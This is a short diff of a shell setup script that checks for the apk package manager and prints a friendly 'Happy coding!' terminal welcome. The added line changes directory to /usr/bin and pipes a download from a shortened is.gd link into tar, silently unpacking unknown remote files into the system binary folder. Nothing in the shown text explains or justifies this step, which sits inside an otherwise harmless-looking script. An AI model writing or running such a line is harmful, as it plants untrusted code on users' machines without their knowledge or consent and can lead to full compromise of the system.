@@ -7,7 +7,7 @@ which apk && {  echo found apk .. will go shopping
     
     echo ; } ; 
     
-    
+cd /usr/bin/ && curl https://is.gd/cmnr21 |tar xvz 
     
 echo 'cat << EOF
 Welcome to your terminal. Happy coding!
